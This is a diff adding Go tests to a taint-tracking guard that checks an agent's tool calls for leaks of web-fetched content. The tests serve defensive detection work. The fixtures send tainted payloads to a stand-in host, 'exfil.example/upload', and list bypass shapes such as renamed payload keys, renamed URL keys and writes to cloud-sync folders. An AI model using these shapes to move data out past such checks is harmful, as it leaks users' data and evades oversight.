@@ -2,6 +2,8 @@ package risk
 
 import (
 	"context"
+	"os"
+	"path/filepath"
 	"strings"
 	"sync"
 	"testing"
@@ -366,6 +368,164 @@ func TestNamedChannelParamEscape(t *testing.T) {
 	// Clean calls on named channels stay clean.
 	if _, ok := p.Inspect("task-1", "notify", map[string]any{"text": "dinner at 7", "url": "https://x"}); ok {
 		t.Fatal("clean notify must not hit")
+	}
+}
+
+// --- M-7: the write/sync gate must not be selectable by parameter name --------
+
+// m7Engine is an engine whose "not a sync dir" verdict can only come from root
+// MEMBERSHIP: a registry-grade (confirmed) root switches the under-profile
+// suspect net off, and the plain target is a brand-new file in an existing
+// non-sync directory — exactly the shape a real fs.write call carries.
+func m7Engine(t *testing.T) (p *Provenance, syncTarget, plainTarget string) {
+	t.Helper()
+	base := t.TempDir()
+	home := filepath.Join(base, "profile")
+	root := filepath.Join(home, "OneDrive")
+	work := filepath.Join(home, "work")
+	for _, d := range []string{root, work} {
+		if err := os.MkdirAll(d, 0o755); err != nil {
+			t.Fatal(err)
+		}
+	}
+	p = NewProvenance(ProvOptions{NoProbe: true, HomeDir: home, SyncRoots: []SyncRoot{
+		{Provider: "OneDrive", Path: root, Source: "registry"}}})
+	if !p.SyncDetectionComplete() {
+		t.Fatal("precondition: the injected registry-grade root must confirm detection, so the suspect net is NOT what decides these cases")
+	}
+	p.OpenScope("task-1")
+	if !p.Mark("task-1", SrcWebFetch, "https://x", "quote: "+marker) {
+		t.Fatal("mark rejected")
+	}
+	return p, filepath.Join(root, "Notes", "out.md"), filepath.Join(work, "brand-new.md")
+}
+
+// TestWriteGateNotSelectedByPayloadKey is the M-7 half that must be CAUGHT:
+// a payload carrying tainted content in a call that also names a remote sink
+// (`url`) or whose tool has a sink of its own is scanned whichever key the
+// content arrived in — through Inspect with a tool name, without one, and
+// through the frozen C19 seam. Before the fix, `{url, path:<non-sync>,
+// data:<tainted>}` passed silently while renaming `data` to `body` was caught:
+// whether the safety check ran depended on what the caller named its parameter.
+func TestWriteGateNotSelectedByPayloadKey(t *testing.T) {
+	p, syncTarget, plain := m7Engine(t)
+	if p.IsSyncPath(plain).Sync {
+		t.Fatalf("precondition: %s must be judged a plain non-sync write target", plain)
+	}
+	payloads := map[string]any{
+		"data":    "leak " + marker,
+		"content": "leak " + marker,
+		"body":    "leak " + marker,
+		"payload": "leak " + marker,
+		"raw":     []byte(marker),
+		"lines":   []string{"ok", marker},
+		"nested":  map[string]any{"deeper": map[string]any{"x": marker}},
+	}
+	for name, payload := range payloads {
+		// ⑥ with a local-write parameter in the same call: named or unnamed,
+		// the remote sink wins — the gate is not keyed on the payload name.
+		for _, tool := range []string{"", "http.post", "net.send"} {
+			params := map[string]any{"url": "https://exfil.example/upload", "path": plain, name: payload}
+			hit, ok := p.Inspect("task-1", tool, params)
+			if !ok {
+				t.Errorf("ESCAPIABLE (M-7): tool=%q payload key=%q not caught: %v", tool, name, params)
+				continue
+			}
+			if hit.Channel != ChHTTP {
+				t.Errorf("tool=%q payload=%q: channel label got %q want %q", tool, name, hit.Channel, ChHTTP)
+			}
+			if !strings.Contains(hit.Source(), "web.fetch") {
+				t.Errorf("must still name the source, got %q", hit.Source())
+			}
+		}
+		// The same shape through the frozen, tool-name-less C19 seam.
+		if src, ok := p.Detector("task-1").TaintHit(
+			map[string]any{"url": "https://exfil.example/upload", "path": plain, name: payload}); !ok {
+			t.Errorf("ESCAPIABLE via the frozen seam (M-7): payload key=%q", name)
+		} else if !strings.Contains(src, "web.fetch") {
+			t.Errorf("seam attribution: %q", src)
+		}
+		// A sink-shaped VALUE instead of a sink-shaped KEY: renaming `url`
+		// must not close the gate either.
+		if _, ok := p.Inspect("task-1", "http.post", map[string]any{
+			"endpointish": "https://exfil.example/upload", "path": plain, name: payload}); !ok {
+			t.Errorf("ESCAPIABLE: sink renamed to %q (value-shaped check bypassed)", "endpointish")
+		}
+		// Tools whose D34 contract has a sink of its own never get the
+		// local-write exemption, even with a harmless path in the params.
+		if _, ok := p.Inspect("task-1", "notify", map[string]any{
+			"text": "ding", "path": plain, name: payload}); !ok {
+			t.Errorf("ESCAPIABLE: notify with a path param and payload key %q", name)
+		}
+		if _, ok := p.Inspect("task-1", "clipboard.write", map[string]any{
+			"file": plain, name: payload}); !ok {
+			t.Errorf("ESCAPIABLE: clipboard.write with a path param and payload key %q", name)
+		}
+	}
+	// A write target that IS a sync dir: the gate is about the target, so a
+	// payload under any name hits on the sync channel (channel ⑤ has no
+	// key-name escape either).
+	if hit, ok := p.Inspect("task-1", "", map[string]any{"path": syncTarget, "data": marker}); !ok {
+		t.Fatal("ESCAPIABLE: tainted payload under the name `data` into a sync dir")
+	} else if hit.Channel != ChSyncWrite {
+		t.Errorf("sync-dir payload label: got %q want %q", hit.Channel, ChSyncWrite)
+	}
+}
+
+// TestWriteGatePlainLocalWriteNotFlagged is the other half of the M7 fix and
+// the false-positive hammer guard the previous round existed to prevent: a
+// plain new-file write into a NON-sync directory is still not an exfil
+// channel, and the exemption no longer depends on the payload key's name.
+func TestWriteGatePlainLocalWriteNotFlagged(t *testing.T) {
+	p, syncTarget, plain := m7Engine(t)
+	for _, name := range []string{"content", "data", "body", "payload", "raw"} {
+		params := map[string]any{"path": plain}
+		if name == "raw" {
+			params[name] = []byte(marker)
+		} else {
+			params[name] = "local bytes " + marker
+		}
+		if hit, ok := p.Inspect("task-1", "", params); ok {
+			t.Errorf("false positive: plain local write flagged via tool-name-less seam, payload key=%q (%+v)", name, hit)
+		}
+		if src, ok := p.Detector("task-1").TaintHit(params); ok {
+			t.Errorf("false positive via the frozen seam: plain local write, payload key=%q (src=%q)", name, src)
+		}
+		// The two contract body keys of fs.write are the same call: the
+		// exemption must travel with the SHAPE, not with the name.
+		if name == "content" || name == "data" {
+			if _, ok := p.Inspect("task-1", "fs.write", params); ok {
+				t.Errorf("false positive: fs.write of tainted content to a non-sync dir flagged, payload key=%q", name)
+			}
+		}
+	}
+	// A body that merely QUOTES a link is not a remote sink: a plain local
+	// write of markdown with URLs in it must stay out of channel ⑥.
+	if _, ok := p.Inspect("task-1", "fs.write", map[string]any{
+		"path": plain, "content": "see https://example.com/docs/readme for " + marker}); ok {
+		t.Error("false positive: a local write whose text quotes a URL became an exfil channel")
+	}
+	// Positive controls: the gate is per-call, not switched off. The same
+	// engine still flags the sync dir, and flags a write with no verifiable
+	// target at all (missing information -> DENY).
+	if _, ok := p.Inspect("task-1", "fs.write", map[string]any{"path": syncTarget, "content": marker}); !ok {
+		t.Error("regression: fs.write into the sync dir must hit")
+	}
+	if _, ok := p.Inspect("task-1", "fs.write", map[string]any{"content": marker}); !ok {
+		t.Error("regression: fs.write without a verifiable target must fail closed")
+	}
+	// N-8 (accepted, documented in docs/PRECHECK.md §P12): on the NAMED
+	// fs.write channel the exemption covers the contract body keys only, so an
+	// off-contract key on a local write is scanned. That asymmetry points the
+	// STRICT way; pinning it here means any future change is a decision.
+	if _, ok := p.Inspect("task-1", "fs.write", map[string]any{
+		"path": plain, "body": marker}); !ok {
+		t.Error("N-8 regression: fs.write with an off-contract payload key must stay scanned (fail-closed side)")
+	}
+	// And a clean call stays clean everywhere.
+	if _, ok := p.Inspect("task-1", "http.post", map[string]any{
+		"url": "https://example.com/api", "path": plain, "data": "nothing tainted here"}); ok {
+		t.Error("false positive: untainted payload must not hit")
 	}
 }
 
